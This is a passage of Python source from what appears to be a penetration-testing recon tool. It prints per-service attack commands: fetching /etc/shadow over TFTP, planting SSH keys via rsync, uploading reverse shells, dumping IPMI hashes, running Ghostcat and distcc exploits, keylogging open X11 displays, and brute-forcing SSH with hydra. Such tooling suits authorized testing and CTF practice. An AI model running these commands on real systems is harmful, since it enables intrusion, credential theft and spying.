    elif svc == "rsync" or pr.port == 873:
        print(f"  {C.GREY}>> rsync --list-only rsync://{host}:{pr.port}/{C.END}")
        print(f"  {C.GREY}>> rsync -av rsync://{host}:{pr.port}/SHARE ./loot/{C.END}")
        print(f"  {C.YELLOW}  ⚡ If writable: upload SSH keys or cron reverse shells{C.END}")
        print(f"  {C.GREY}>> rsync -av ~/.ssh/authorized_keys rsync://{host}:{pr.port}/SHARE/.ssh/  # if writable{C.END}")

    elif svc == "TFTP" or pr.port == 69:
        print(f"  {C.YELLOW}  ⚡ TFTP has no authentication — grab anything you can{C.END}")
        print(f"  {C.GREY}>> tftp {host}{C.END}")
        print(f"  {C.GREY}>>   tftp> get /etc/passwd{C.END}")
        print(f"  {C.GREY}>>   tftp> get /etc/shadow{C.END}")
        print(f"  {C.GREY}>>   tftp> get /boot/grub/grub.cfg  # common config file{C.END}")
        print(f"  {C.GREY}>>   tftp> get /boot.ini  # Windows{C.END}")
        print(f"  {C.GREY}# --- Nmap scripts ---{C.END}")
        print(f"  {C.GREY}>> nmap -p 69 --script tftp-enum {host}  # enumerate common paths{C.END}")
        print(f"  {C.GREY}# --- Brute-force download ---{C.END}")
        print(f"  {C.GREY}  for f in $(cat /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt); do{C.END}")
        print(f"  {C.GREY}    tftp {host} -c get \"$f\" 2>/dev/null && echo \"Got: $f\"; done{C.END}")
        print(f"  {C.YELLOW}  ⚡ Try uploading reverse shell if writable: tftp> put shell.php{C.END}")

    elif svc == "IPMI" or pr.port == 623:
        print(f"  {C.YELLOW}  ⚡ IPMI - hash dumping often works without creds!{C.END}")
        print(f"  {C.GREY}>> ipmitool -I lanplus -H {host} -U '' -P '' user list{C.END}")
        print(f"  {C.GREY}>> ipmitool -I lanplus -H {host} -U admin -P admin user list  # try default{C.END}")
        print(f"  {C.GREY}>> ipmitool -I lanplus -H {host} -U admin -P admin user list  # try default{C.END}")
        print(f"  {C.GREY}>> ipmitool -I lanplus -H {host} -U admin -P '' user list{C.END}")
        print(f"  {C.GREY}  Crack dumped hashes: hashcat -m 7300 hash.txt {WL.get('rockyou','/usr/share/wordlists/rockyou.txt')}{C.END}")
        print(f"  {C.GREY}  Crack hashes: hashcat -m 7300 hash.txt rockyou.txt{C.END}")

    elif svc == "IRC" or pr.port in (6667, 6697, 6660, 6661, 6662, 6663, 6664, 6665, 6666, 6668, 6669, 7000):
        print(f"  {C.GREY}>> nc -nv {host} {pr.port}  # banner / manual interaction{C.END}")
        print(f"  {C.GREY}>> printf 'NICK test\r\nUSER test 0 * :test\r\nADMIN\r\nVERSION\r\nINFO\r\nTIME\r\nLINKS\r\n' | nc -nv {host} {pr.port}{C.END}")
        if pr.banner_raw:
            _irc_lines = []
            for _ln in pr.banner_raw.splitlines():
                _ls = _ln.strip()
                if not _ls:
                    continue
                if any(tok in _ls for tok in ("NOTICE AUTH", " 256 ", " 257 ", " 258 ", " 351 ", " 371 ", " 391 ", " 364 ", "Unreal", "ircd")):
                    _irc_lines.append(_ls)
            if _irc_lines:
                print(f"  {C.CYAN}IRC probe:{C.END}")
                for _ln in _irc_lines[:10]:
                    _col = C.RED if any(tok in _ln.lower() for tok in ("unreal", "admin", "widely@used", "bob smith", "irked.htb")) else C.DIM
                    print(f"    {_col}{_ln[:220]}{C.END}")
        if (pr.banner and "unrealircd" in pr.banner.lower()) or (pr.banner_raw and "unreal" in pr.banner_raw.lower()):
            print(f"  {C.RED}  ⚡ UnrealIRCd detected - CHECK CVE-2010-2075 backdoor! searchsploit unrealircd{C.END}")
        print(f"  {C.GREY}>> searchsploit unrealircd  # 3.2.8.1 backdoor (very common in CTFs){C.END}")

    elif svc == "AJP" or pr.port == 8009:
        print(f"  {C.RED}  ⚡ AJP (Apache JServ) - check Ghostcat CVE-2020-1938!{C.END}")
        print(f"  {C.GREY}>> python3 /usr/share/exploitdb/exploits/multiple/webapps/48143.py {host}  # Ghostcat LFI{C.END}")
        print(f"  {C.GREY}>> searchsploit ghostcat  # or: searchsploit ajp{C.END}")
        print(f"  {C.GREY}  Ghostcat reads /WEB-INF/web.xml, may contain credentials{C.END}")

    elif svc == "distcc" or pr.port == 3632:
        print(f"  {C.RED}  ⚡ distcc - often vulnerable to CVE-2004-2687 (RCE)!{C.END}")
        print(f"  {C.GREY}>> searchsploit distcc  # CVE-2004-2687{C.END}")
        print(f"  {C.GREY}>> python3 distcc_exploit.py {host} {pr.port} 'id'  # manual exploit script{C.END}")

    elif svc == "X11" or pr.port == 6000:
        print(f"  {C.YELLOW}  ⚡ X11 - if no auth, you can screenshot/keylog the display!{C.END}")
        print(f"  {C.GREY}>> xdpyinfo -display {host}:0  # check if open{C.END}")
        print(f"  {C.GREY}>> xwd -root -display {host}:0 -out screenshot.xwd  # screenshot{C.END}")
        print(f"  {C.GREY}>> convert screenshot.xwd screenshot.png  # view it{C.END}")
        print(f"  {C.GREY}>> xspy {host}  # keylogger{C.END}")

    elif svc == "CouchDB" or pr.port == 5984:
        print(f"  {C.GREY}>> curl http://{host}:{pr.port}/  # version info{C.END}")
        print(f"  {C.GREY}>> curl http://{host}:{pr.port}/_all_dbs  # list databases{C.END}")
        print(f"  {C.GREY}>> curl http://{host}:{pr.port}/DATABASE/_all_docs  # dump docs{C.END}")
        print(f"  {C.GREY}>> curl http://{host}:{pr.port}/_users/_all_docs?include_docs=true  # dump users{C.END}")
        print(f"  {C.YELLOW}  ⚡ CouchDB often has no auth! Check for privesc via _config endpoint{C.END}")

    elif pr.port == 1099:  # Java RMI
        print(f"  {C.GREY}>> rmg scan {host} {pr.port}  # remote-method-guesser{C.END}")
        print(f"  {C.GREY}>> rmg enum {host} {pr.port}{C.END}")
        print(f"  {C.GREY}>> searchsploit java rmi  # manual exploit scripts{C.END}")

    elif pr.port in (512, 513, 514):  # rexec/rlogin/rsh
        print(f"  {C.YELLOW}  ⚡ R-services - often allow passwordless root login!{C.END}")
        print(f"  {C.GREY}>> rlogin -l root {host}  # try rlogin{C.END}")
        print(f"  {C.GREY}>> rsh -l root {host} id  # try rsh{C.END}")
        print(f"  {C.GREY}>> rexec {host}  # try rexec{C.END}")
        print(f"  {C.GREY}>> rwho {host}  # enumerate logged-in users{C.END}")

    elif svc == "Squid" or pr.port == 3128:
        print(f"  {C.YELLOW}  ⚡ Squid proxy - scan internal ports through it!{C.END}")
        print(f"  {C.GREY}>> curl --proxy http://{host}:3128 http://127.0.0.1/{C.END}")
        print(f"  {C.GREY}>> curl --proxy http://{host}:3128 http://127.0.0.1:8080/{C.END}")
        print(f"  {C.GREY}>> # Add to /etc/proxychains4.conf: http {host} 3128{C.END}")
        print(f"  {C.GREY}>> for port in $(seq 1 65535); do curl -s -o /dev/null -w \"%{{http_code}} $port\" --proxy http://{host}:3128 http://127.0.0.1:$port 2>/dev/null; done  # internal port scan{C.END}")

    elif pr.port == 8089:  # Splunkd
        print(f"  {C.GREY}>> curl -k https://{host}:8089/services/authentication/users -u admin:changeme{C.END}")
        print(f"  {C.GREY}  Default creds: admin:changeme{C.END}")
        print(f"  {C.GREY}>> searchsploit splunk{C.END}")
        print(f"  {C.YELLOW}  ⚡ Splunk forwarder → RCE via custom app deployment{C.END}")

    elif svc == "FTPS" or pr.port == 990:
        print(f"  {C.GREY}>> openssl s_client -connect {host}:{pr.port}  # connect to FTPS{C.END}")
        print(f"  {C.GREY}>> lftp -u anonymous,anonymous -e 'set ftp:ssl-force true; ls; bye' {host}{C.END}")

    elif svc == "Cassandra" or pr.port == 9042:
        print(f"  {C.GREY}>> cqlsh {host} {pr.port}  # Cassandra query shell{C.END}")
        print(f"  {C.GREY}>> cqlsh {host} {pr.port} -e 'DESCRIBE KEYSPACES;'{C.END}")
        print(f"  {C.YELLOW}  ⚡ Often no-auth in lab environments{C.END}")

    else:
        # Unknown service — rich banner analysis + actionable investigation steps
        # nc already shown by sequential mode OR by the banner-grab command above
        import re as _re_inner
        _banner_raw = (pr.banner or "")
        _banner_low = _banner_raw.lower()
        _port_note  = f"port {pr.port}"

        if _banner_raw and len(_banner_raw) > 3:
            # ── Windows system-info banners (e.g. "system windows 6.2") ────────
            _win_sys_m = _re_inner.search(r"system\s+windows\s+([\d.]+)", _banner_low)
            if _win_sys_m:
                _win_ver = _win_sys_m.group(1)
                _win_name = {"6.0":"Vista/2008","6.1":"7/2008R2","6.2":"8/2012",
                             "6.3":"8.1/2012R2","10.0":"10/2016/2019/2022"}.get(_win_ver, _win_ver)
                print(f"  {C.YELLOW}⚡ Windows service banner: Windows {_win_ver} ({_win_name}){C.END}")
                print(f"  {C.GREY}$ nc -nv {host} {pr.port}  # reconnect — try: help / ? / GET / POST / LIST / STATUS{C.END}")
                print(f"  {C.GREY}$ printf 'help\\r\\n' | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ printf '?\\r\\n'    | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ printf 'STATUS\\r\\n' | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ curl -sk http://{host}:{pr.port}/   # test HTTP{C.END}")
                print(f"  {C.GREY}$ curl -sk https://{host}:{pr.port}/  # test HTTPS{C.END}")
                # Port-specific hints for common Windows services
                if pr.port == 7680:
                    print(f"  {C.DIM}  Port 7680 = Windows Update Delivery Optimization (WUDO) — likely safe to skip{C.END}")
                    print(f"  {C.GREY}$ nmap -sV -p {pr.port} --script banner {host}{C.END}")
                elif 1900 <= pr.port <= 2000:
                    print(f"  {C.DIM}  Port range 1900-2000 may be SSDP/UPnP or custom app service{C.END}")
                    print(f"  {C.GREY}$ nmap -sV -p {pr.port} --script upnp-info {host}{C.END}")
                else:
                    print(f"  {C.GREY}$ nmap -sV -p {pr.port} --script banner,fingerprint-strings {host}{C.END}")
                    print(f"  {C.GREY}$ searchsploit windows {_win_ver}  # OS-level exploits if relevant{C.END}")

            # ── Service banners that support HTTP-like verbs ─────────────────
            elif any(kw in _banner_low for kw in ("get", "post", "http", "html", "200 ok", "400 bad")):
                print(f"  {C.YELLOW}⚡ HTTP-like protocol detected on non-standard port{C.END}")
                print(f"  {C.GREY}$ curl -sk http://{host}:{pr.port}/  # full HTTP response{C.END}")
                print(f"  {C.GREY}$ curl -sk https://{host}:{pr.port}/  # try HTTPS too{C.END}")
                print(f"  {C.GREY}$ curl -sSikL http://{host}:{pr.port}/  # follow redirects + headers{C.END}")
                print(f"  {C.GREY}$ whatweb http://{host}:{pr.port}/{C.END}")
                _ver_hint = _re_inner.search(r'[\d]+\.[\d]+', _banner_raw)
                if _ver_hint:
                    _svc_guess = _banner_raw.split()[0][:30] if _banner_raw.split() else "service"
                    print(f"  {C.GREY}$ searchsploit {_svc_guess}  # version in banner{C.END}")

            # ── FTP-like banners ─────────────────────────────────────────────
            elif _banner_low.startswith("220") or "ftp" in _banner_low:
                print(f"  {C.YELLOW}⚡ FTP-like service (220 banner){C.END}")
                print(f"  {C.GREY}$ ftp {host} {pr.port}  # interactive; try anonymous / anonymous{C.END}")
                print(f"  {C.GREY}$ nc -nv {host} {pr.port}  # raw: USER anonymous PASS anonymous@{C.END}")

            # ── SSH-like banners ─────────────────────────────────────────────
            elif "ssh" in _banner_low or _banner_low.startswith("ssh-"):
                _ssh_ver = _re_inner.search(r"openssh[_-]([\d.]+p?\d*)", _banner_low)
                print(f"  {C.YELLOW}⚡ SSH on non-standard port{C.END}")
                if _ssh_ver:
                    print(f"  {C.GREY}$ searchsploit openssh {_ssh_ver.group(1)}{C.END}")
                print(f"  {C.GREY}$ ssh -p {pr.port} {host}  # manual login{C.END}")
                print(f"  {C.GREY}$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{host}:{pr.port}{C.END}")

            # ── Custom protocol — generic rich probing ───────────────────────
            else:
                print(f"  {C.YELLOW}⚡ Custom protocol/service — systematic probing{C.END}")
                print(f"  {C.GREY}$ nc -nv {host} {pr.port}  # reconnect + try: help, ?, version, info, status, ls, dir{C.END}")
                print(f"  {C.GREY}$ printf 'help\\r\\n'    | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ printf '?\\r\\n'       | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ printf 'version\\r\\n' | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ printf 'info\\r\\n'    | nc -nv -w3 {host} {pr.port}{C.END}")
                print(f"  {C.GREY}$ curl -sk http://{host}:{pr.port}/   # test HTTP{C.END}")
                print(f"  {C.GREY}$ curl -sk https://{host}:{pr.port}/  # test HTTPS{C.END}")
                print(f"  {C.GREY}$ nmap -sV -p {pr.port} --script banner,fingerprint-strings {host}{C.END}")
                _ver_hint = _re_inner.search(r'[\d]+\.[\d]+', _banner_raw)
                if _ver_hint:
                    _svc_guess = _banner_raw.split()[0][:30] if _banner_raw.split() else "service"
                    print(f"  {C.GREY}$ searchsploit {_svc_guess}  # version detected in banner{C.END}")
        else:
            # No banner — systematic probes
            if not _is_seq:
                print(f"  {C.GREY}$ nc -nv {host} {pr.port}  # grab banner; try: help / ? / version / GET /{C.END}")
            print(f"  {C.GREY}$ printf 'help\\r\\n'    | nc -nv -w3 {host} {pr.port}  # service command help{C.END}")
            print(f"  {C.GREY}$ printf '?\\r\\n'       | nc -nv -w3 {host} {pr.port}  # short help{C.END}")
            print(f"  {C.GREY}$ printf 'version\\r\\n' | nc -nv -w3 {host} {pr.port}  # version info{C.END}")
            print(f"  {C.GREY}$ curl -sk http://{host}:{pr.port}/   # test if HTTP{C.END}")
            print(f"  {C.GREY}$ curl -sk https://{host}:{pr.port}/  # test if HTTPS{C.END}")
            print(f"  {C.GREY}$ nmap -sV -p {pr.port} --script banner,fingerprint-strings {host}{C.END}")
            if _is_windows and pr.port >= 49152:
                print(f"  {C.DIM}  (high port on Windows — likely ephemeral RPC endpoint){C.END}")
                print(f"  {C.GREY}$ impacket-rpcdump {host} -p 135  # map all RPC endpoints{C.END}")
            elif _is_windows:
                print(f"  {C.GREY}$ impacket-rpcdump {host} | grep -i {pr.port}  # is this an RPC endpoint?{C.END}")
                print(f"  {C.GREY}$ searchsploit <service_name>  # after identifying service{C.END}")
            else:
                print(f"  {C.GREY}$ searchsploit <service_name>  # after identifying service{C.END}")

    # PentestPad + HackTricks reference links (always at end of port block)
    plink = pentestpad_link(pr.port)
    if plink:
        print(f"  {C.GREY}📎 {plink}{C.END}")
    hlink = hacktricks_link(pr.port)
    if hlink:
        print(f"  {C.GREY}📎 {hlink}{C.END}")


# --------------------------- Second-pass TCP verification ---------------------------
